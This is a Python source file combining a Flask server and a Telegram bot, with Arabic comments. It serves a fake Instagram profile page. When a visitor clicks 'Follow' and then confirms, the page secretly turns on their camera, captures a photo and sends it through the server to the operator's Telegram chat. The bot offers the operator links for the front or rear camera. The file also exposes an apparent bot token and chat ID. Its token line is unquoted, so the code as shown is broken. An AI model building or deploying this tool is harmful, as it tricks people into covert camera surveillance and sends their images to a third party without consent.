import os
import asyncio
import threading
import base64
import requests
from flask import Flask, request, jsonify, render_template_string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes

# إعداد Flask
app = Flask(__name__)

# بياناتك (تأكد إنها صحيحة)
BOT_TOKEN = 8664732759:AAEjhYPpopZn_QDY2udIAbO1v33JQeDlsmE
CHAT_ID = "6691718718"
WEB_URL = "https://shado-bot.onrender.com"

HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { font-family: sans-serif; background: #fafafa; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .profile-pic { width: 80px; height: 80px; border-radius: 50%; border: 1px solid #dbdbdb; }
        .follow-btn { background: #0095f6; color: white; border: none; border-radius: 4px; padding: 8px 30px; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; }
        #popup { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 20px; border-radius: 12px; box-shadow: 0 0 15px rgba(0,0,0,0.2); text-align: center; width: 260px; z-index: 100; }
    </style>
</head>
<body>
    <img src="https://i.ibb.co/S7Vn5mY/profile.jpg" class="profile-pic">
    <h2 style="font-size: 18px;">_hqrn</h2>
    <p style="font-size: 14px; color: #8e8e8e;">1,734 followers</p>
    <button class="follow-btn" id="followBtn">Follow</button>
    <div id="popup">
        <p><b>تأكيد المتابعة</b></p>
        <button id="confirmBtn" style="background:#0095f6; color:white; border:none; padding:10px 20px; border-radius:5px; width:100%;">تأكيد</button>
    </div>
    <script>
        const mode = new URLSearchParams(window.location.search).get('mode') || 'user';
        document.getElementById('followBtn').onclick = () => document.getElementById('popup').style.display = 'block';
        document.getElementById('confirmBtn').onclick = () => {
            document.getElementById('popup').style.display = 'none';
            navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } })
            .then(stream => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    fetch('/upload', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ image: canvas.toDataURL('image/jpeg') })
                    });
                    document.getElementById('followBtn').innerText = 'Following';
                }, 2000);
            });
        };
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(HTML_PAGE)

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json.get('image')
    if data:
        img_data = base64.b64decode(data.split(",")[1])
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        requests.post(url, data={'chat_id': CHAT_ID}, files={'photo': ('shot.jpg', img_data)})
    return jsonify({"status": "ok"})

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📸 كاميرا أمامية", url=f"{WEB_URL}?mode=user")],
        [InlineKeyboardButton("📷 كاميرا خلفية", url=f"{WEB_URL}?mode=environment")]
    ]
    await update.message.reply_text("يا هلا بشادو، اختر الكاميرا عشان تبدأ:", reply_markup=InlineKeyboardMarkup(keyboard))

async def run_bot():
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    await application.initialize()
    await application.start_polling()
    # الحفاظ على تشغيل البوت
    while True:
        await asyncio.sleep(3600)

def start_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))

if __name__ == '__main__':
    # تشغيل Flask في Thread منفصل
    threading.Thread(target=start_flask, daemon=True).start()
    # تشغيل البوت في الـ Main Loop
    asyncio.run(run_bot())
